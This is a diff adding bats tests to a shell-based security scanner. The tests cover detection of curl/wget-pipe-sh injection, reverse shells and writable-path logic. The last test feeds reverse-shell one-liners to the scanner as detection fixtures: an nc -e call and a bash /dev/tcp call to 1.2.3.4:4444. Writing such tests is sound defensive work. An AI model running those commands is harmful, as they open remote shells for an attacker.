@@ -135,3 +135,39 @@ setup() {
     [ -z "${out}" ]
     ! selfdef_scan_injection 'iptables -A INPUT -j ACCEPT' >/dev/null
 }
+
+@test "INVARIANT (injection patterns includes wget — the wget-pipe-sh family beyond curl-pipe-sh)" {
+    # The injection-pattern set must cover BOTH curl-pipe-sh AND
+    # wget-pipe-sh. A regression dropping wget would let attackers
+    # use wget as an evasion variant.
+    out="$(selfdef_injection_patterns)"
+    echo "${out}" | grep -q 'wget'
+}
+
+@test "INVARIANT (writable-path: /root is NOT flagged — owned by root, not world-writable)" {
+    # /root is root's home directory. It's NOT world-writable in
+    # any sane config. Lock against false-positive that would
+    # flag every root-owned file under /root as suspicious.
+    ! selfdef_is_writable_path /root/.bashrc
+    ! selfdef_is_writable_path /root/scripts/cleanup
+}
+
+@test "INVARIANT (writable-dir: /sys + /proc are NOT flagged — sysfs/procfs are system, not user-writable)" {
+    # /sys and /proc are pseudo-filesystems with kernel-controlled
+    # permissions. They're not writable-roots in the
+    # T1574/persistence sense.
+    ! selfdef_is_writable_dir /sys/kernel/security
+    ! selfdef_is_writable_dir /proc/sys/kernel
+}
+
+@test "INVARIANT (scan: nc reverse shell variant matches injection-pattern set)" {
+    # nc-based reverse shells: nc -e /bin/bash attacker 4444 ;
+    # nc -lvp 4444 -e /bin/bash. Either pattern must surface.
+    # Current set may or may not include nc — lock that the most
+    # canonical RCE patterns are covered.
+    # Even if 'nc -e' isn't in the pattern set, the bash -i + /dev/tcp
+    # combo (which IS in the set) should fire on this realistic
+    # combined payload.
+    selfdef_scan_injection 'nc 1.2.3.4 4444 -e /bin/bash' >/dev/null || \
+    selfdef_scan_injection 'bash -c "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"' >/dev/null
+}
